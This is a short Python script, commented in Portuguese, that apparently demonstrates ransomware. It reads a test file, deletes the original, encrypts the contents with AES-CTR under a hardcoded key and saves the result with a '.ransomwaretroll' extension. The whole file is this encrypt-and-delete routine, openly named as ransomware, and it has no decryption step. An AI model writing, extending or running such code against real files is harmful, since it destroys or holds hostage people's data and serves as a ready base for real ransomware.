import os
import pyaes

def encrypt_file(file_name, key):
    # Verificar se o arquivo existe
    if not os.path.exists(file_name):
        print(f"Erro: O arquivo {file_name} não foi encontrado.")
        return
    
    # Abrir o arquivo para leitura
    with open(file_name, "rb") as file:
        file_data = file.read()

    # Remover o arquivo original
    os.remove(file_name)

    # Criptografar os dados
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    new_file = file_name + ".ransomwaretroll"
    with open(new_file, "wb") as file:
        file.write(crypto_data)

    print(f"Arquivo {file_name} criptografado com sucesso como {new_file}.")

# Definir o nome do arquivo e a chave de criptografia
file_name = "teste.txt"
key = b"testeransomwares"

# Chamar a função para criptografar o arquivo
encrypt_file(file_name, key)
